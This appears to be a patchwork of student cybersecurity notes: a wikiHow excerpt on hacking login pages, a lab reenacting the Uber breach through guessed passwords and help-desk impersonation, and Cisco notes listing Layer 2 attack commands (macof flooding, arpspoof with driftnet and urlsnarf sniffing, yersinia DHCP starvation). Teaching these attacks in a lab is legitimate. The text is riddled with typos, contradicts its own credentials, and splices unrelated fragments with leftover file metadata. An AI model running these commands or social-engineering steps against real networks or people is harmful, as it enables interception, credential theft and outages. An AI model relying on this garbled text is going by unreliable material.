## 1.0 What is Cybersecurity

Cybersecuerity is the techniques, process, designs and archectures used in securring devices, networks and data from unauthrized access.

### 1.1 Types of Security

1.1.1 Information Security

Information security is the protection of data from unauthorized access.

### Lab: Lab: How to Hack a Website with Basic HTML Coding: (https://www.wikihow.com/Hack-a-Website-with-Basic-HTML-Coding)
Written by Nicole Levine, MFA

Last Updated: August 13, 2022 Tested

This wikiHow teaches you different ways to gain access to a website by hacking a login page. Websites are far more advanced and secure than they used to be, so there's virtually no way to gain access to private information just by looking at or writing basic HTML. It's much harder to hack into websites in general, especially if you're a novice! But, if you come across an older website written in rudimentary HTML by a beginning web developer, there's a slight chance you may come across passwords in the website's source code. A slightly more reliable way to exploit a website's login screen is to try a SQL injection. Whatever you do, don't hack into any websites without consentâ€”it's illegal and could get you into big trouble.

### Lab: Simulate conditions for the Uber Breach
Case Study:
How a Teenager Hacked Uber: (https://www.youtube.com/watch?v=eS4qFPkl_rw)

Find out more about the breach

Purpose: Illustrate how confinetially,Integrity and Availability can be threatened through the attack 
on an employee and the enterprise has poor security protections.

What you will learn:
linux commands: mkdir, cd, touch, nano, cat, top, uname
nmap
wireshark
hydra
crunch
john the ripper

Scenario:
While riding in an Uber you notice a card partially hanging from the visor of the visor on the 
passenger side of the car. Information about the employee login was partially available.

https://company.com/login
Employee: Smith.?
Employee #:emp52__34
password: Roll__t
Social Engineering: 

You find out that the driver attending the University of Alabama
Played football his freshment year as a defense guard wearing the number 62,
Had to srop after injuries from a call accident his freshmen year. His 
inability to play resulted in a loss of his scholarship and withdrawal from the University.

Putting it together you determine:
Employee: Smith.Robert
Employee #:wmp52__34
passord: Roll62tide

A list of all possible numbers using cewl was generated.
Pretending to be the corporate help desk

You are now in.
Has you poke around around you see a few company files.
One of the directories says test_scripts. In one is a hardcoded user and password that will 
give you remote access via ssh. Discovery scan indicates the existence of an internal server. 

Continued in lab 2

Reading: OPM data breach

What you will earn:
Always enumerate
nmap discovery and host scans
jump servers
types of attackers

The nmap discovey scan found a sshd server. Smith.Pobert's credentials do not work.

{FileName}cisco-secops210255-2-2-1-describe_protocol_headers-MMDDYY
{EpisodeName}Describe Protocol Headers Pt.1
{ShowName}Cisco Cybersecurity Operations
{Keywords}Cisco FMC, Wireshark, Cisco IOS Netflow
#### Describe Protocol Headers
* 2.2 Describe the fields in these protocol headers as they
relate to intrusion analysis:
	+ We want to look at Layer 2 (link-layer) header information and understand what attacks occur here.
	+ "What OSI Layers do Filtering, Access Control Lists,
	  Authentication and Application control protect? 
	  Answer, not Layer 2!! 
		- Layer 2 is considered a trusted layer. The 
		  Ethernet Layer header has information about what?
		  Layers 1 and 2. This where ethernet headers come into
		  play.  Remember that there are no fine grain controls
		  at data-link.
		- Many of the attacks rely on lack of authentication at
		  Layer 2 during communications (MITM possible).
	+ Wired attacks at Layer 2: CAM table exhaustion, ARP
	  Spoofing, DHCP Exhaustion, and VLAN hopping.
	+ Wireless attacks at Layer 2: Hidden Node, Deauth, 
	  Fake Access Points.
	+ 2.2.a Ethernet Frame
		- Preamble
			+ Wirehark (not shown)
			+ 7 bytes (56 bit)
			+ Synchronization Bits
			+ Process by NIC
		- Start of Frame (SOF)
			+ 1 byte
		- Destination MAC
			+ 48 bits (6 bytes) reported in hex
			+ 24 bits (OUI) & 24 bits (Serial)
		- Source MAC
			+ 48 bits (6 bytes) rreported in hex
			+ 24 bits (OUT) & 24 bits (Serial)
		- [Frame Type]
			+ Hex Value to indicate upper layer protocol
			  in data field
			+ 0x800 IPv4 Protocol
			+ 0x806 Address Resolution Prootcol ARP
			+ 0x86DD IPv6 Protocol
		- Data
			+ between 46 and 1500 bytes
		- FCS (Frame Check Sequence)
			+ used by the NIC to identify errors during
			  transmission
	+ Example #1 (CAM Table Exhaustion):
``` 
Simple Diagram
Kali Linux Terminal 
Simple Flooding command: macof -i eth1 -n 10
Targeted Floding command: macof -i eth1 -d 192.168.1.1
List and Describe Counter Measures Possible
Port Security
802.1x 
MAC Filtering
``` 
	+ Example #2 (ARP Spoofing):
``` 
Kali Linux setup port forwarding: echo '1' > /proc/sys/net/
ipv4/ip_forward 
arpspoof -i eth0 -t 192.168.8.90 192.168.8.8 
(setup arpspoof from target to kali)
driftnet -i eth0 (Leave window open)--monitoring
urlsnarf -i eth0 (capture website info)
```
	+ Example #3 (DHCP Starvation):
``` 
Setup DHCP on Router
--show ip dhcp server statistics
--show ip dhcp pool
--show ip dhcp bind
Kali Linux Terminal
++yersinia -G (launches yersinia in Graphical mode)
++Click on DHCP Tab
++(on left side) Click Launch Attack
++choose sending DHCP Discover Packet
--show ip dhcp bind
```

 ## SIEM for beginners
Security information and event management (SIEM) is an approach to security management that combines SIM (security information management) and SEM (security event management) functions into one security management system. The acronym SIEM is pronounced "sim" with a silent e. (https://socfortress.medium.com/build-your-own-siem-stack-with-open-source-tools-series-39da0f2d412a)
